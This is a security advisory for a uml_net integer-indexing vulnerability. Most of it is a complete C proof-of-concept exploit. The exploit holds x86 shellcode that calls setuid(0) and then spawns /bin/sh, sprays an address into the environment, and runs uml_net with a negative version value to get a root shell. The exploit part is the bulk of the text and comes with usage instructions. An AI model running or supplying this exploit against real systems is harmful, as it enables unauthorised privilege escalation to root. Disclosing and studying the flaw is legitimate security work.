source: http://www.securityfocus.com/bid/7676/info

A vulnerability has been discovered in uml_net. Due to integer mismanagement while handling version information, it may be possible for an attacker to execute arbitrary code. Specifically, by supplying a negative value within the version information it is possible to bypass various calculations and cause an invalid indexing into an array of functions. As a result, it is possible for an attacker to execute a function in an attacker-controlled location of memory.

Successful exploitation of this vulnerability would allow an attacker to execute arbitrary commands with the privileges of uml_net, possibly root. 

/*
  uml_net proof of concept exploit 
  
  Tested on: RH 8.0 with default uml_utilities from kernel-utils-2.4-8.13 
             RH 8.0 with binary from uml_utilities_20030312, uml_utilities_20020821
  It may work on other linux distributions 
  
  Author: ktha@hushmail.com
  Based on the bug that I found in uml_net.c on 23.05.2003
  
  Greets: M|G - no1 keep up the good work
  	  securitech guys, security-corp guys - thx for the challenges
  	  all of you who support me in real life 
  
*/


#include <stdio.h>

#define SHELL 0xbffffdd7
#define ROT -302068188

char *
gen (int pad)
{
  int i, size;
  char *p;
  char shellcode[] = "\x31\xc0"	// xorl    %eax,%eax
    "\x31\xdb"			// xorl    %ebx,%ebx
    "\xb0\x17"			// movb    $0x17,%al
    "\xcd\x80"			// int     $0x80
    "\xeb\x18"			// jmp     end
    				// start:
    "\x5e"			// popl    %esi
    "\x89\x76\x08"		// movl    %esi,0x8(%esi)
    "\x31\xc0"			// xorl    %eax,%eax
    "\x88\x46\x07"		// movb    %eax,0x7(%esi)
    "\x89\x46\x0c"		// movl    %eax,0xc(%esi)
    "\xb0\x0b"			// movb    $0xb,%al
    "\x89\xf3"			// movl    %esi,%ebx
    "\x8d\x4e\x08"		// leal    0x8(%esi),%ecx
    "\x8d\x56\x0c"		// leal    0xc(%esi),%edx
    "\xcd\x80"			// int     $0x80
    				// end:
    "\xe8\xe3\xff\xff\xff"	// call    start
    "\x2f\x62\x69\x6e\x2f\x73\x68";	// .string "/bin/sh"


  size = sizeof (shellcode);
  p = (char *) malloc (5000 + size + 1);
  memset (p, 0x90, 5000);
  for (i = 1; i < 1000; i++)
    *(int *) (p + 4 * i + pad) = SHELL;
  memcpy (p + 5000, shellcode, size + 1);
  *p = "SM00NY=";
  return p;
}

void
usage (char *sir)
{
  printf ("\nUsage: %s <UML_NET> [pad]\n\n", sir);
  printf ("Pad value: 0 - 3\nDefault: 0\n");
  printf ("\n");
}
main (int argc, char **argv)
{
  unsigned long pad = 0;
  int loop;
  char s[1000];
  char *nume[4], *pume[2];

  if (argc < 2)
    {
      usage (argv[0]);
      exit (0);
    }

  if (argv[2])
    pad = atoi (argv[2]);

  sprintf (s, "%d", ROT);

  nume[0] = argv[1];
  nume[1] = s;
  nume[2] = "add";
  nume[3] = NULL;

  pume[0] = gen (pad);
  pume[1] = NULL;

  printf ("Trying to exploit.... pad value: %d\n", pad);
  printf ("If you get a segfault, try to change the pad value !\n");

  execve (nume[0], nume, pume);
}